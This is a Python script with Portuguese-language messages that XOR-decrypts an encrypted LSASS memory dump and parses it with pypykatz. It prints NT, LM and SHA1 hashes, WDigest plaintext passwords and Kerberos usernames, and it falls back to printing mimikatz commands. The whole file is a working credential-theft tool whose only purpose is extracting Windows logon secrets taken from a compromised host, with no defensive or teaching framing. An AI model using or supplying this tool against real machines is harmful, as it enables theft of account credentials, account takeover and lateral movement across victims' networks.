import sys
import os

XOR_KEY = 0x81

def decrypt(input_path: str, output_path: str, key: int) -> None:
    print(f"[*] Decriptando {input_path} com chave 0x{key:02X}...")
    with open(input_path, "rb") as f:
        data = bytearray(f.read())
    for i in range(len(data)):
        data[i] ^= key
    with open(output_path, "wb") as f:
        f.write(data)
    print(f"[+] {len(data):,} bytes → {output_path}")

def parse(dump_path: str) -> None:
    try:
        from pypykatz.pypykatz import pypykatz
        print("[*] A analisar com pypykatz...")
        mimi = pypykatz.parse_minidump_file(dump_path)

        found = False
        for luid, session in mimi.logon_sessions.items():
            for cred in (session.msv_creds or []):
                if cred.username:
                    print(f"\n[MSV]  {cred.domainname}\\{cred.username}")
                    nthash = getattr(cred, 'NThash', None)
                    if nthash:
                        print(f"       NT  : {nthash.hex()}")
                    lmhash = getattr(cred, 'LMhash', None)
                    if lmhash:
                        print(f"       LM  : {lmhash.hex()}")
                    sha1 = getattr(cred, 'SHAHash', None)
                    if sha1:
                        print(f"       SHA1: {sha1.hex()}")
                    found = True

            for cred in (session.wdigest_creds or []):
                if cred.password:
                    print(f"[WDigest] {cred.domainname}\\{cred.username}:{cred.password}")
                    found = True

            for cred in (session.kerberos_creds or []):
                if cred.username:
                    print(f"[Kerb] {cred.username}@{cred.domainname}")
                    found = True

        if not found:
            print("[-] Sem credenciais (conta de sistema?)")

    except ImportError:
        print("[-] pypykatz nao instalado  →  pip install pypykatz")
        print(f"[*] Alternativa (mimikatz):")
        print(f"    sekurlsa::minidump {dump_path}")
        print( "    sekurlsa::logonpasswords")

    except Exception as exc:
        print(f"[-] Erro pypykatz: {exc}")
        print(f"[*] Tenta com mimikatz: sekurlsa::minidump {dump_path}")

def main() -> None:
    if len(sys.argv) < 2:
        print(f"Uso: python {sys.argv[0]} <lsass.dmp.enc> [chave_hex]")
        print(f"     Chave padrão: 0x{XOR_KEY:02X}")
        sys.exit(1)

    enc_path = sys.argv[1]
    key      = int(sys.argv[2], 16) if len(sys.argv) > 2 else XOR_KEY

    if not os.path.exists(enc_path):
        print(f"[-] Ficheiro nao encontrado: {enc_path}")
        sys.exit(1)

    dec_path = (enc_path[:-4] if enc_path.endswith(".enc") else enc_path) + ".dmp"
    decrypt(enc_path, dec_path, key)

    parse(dec_path)

if __name__ == "__main__":
    main()
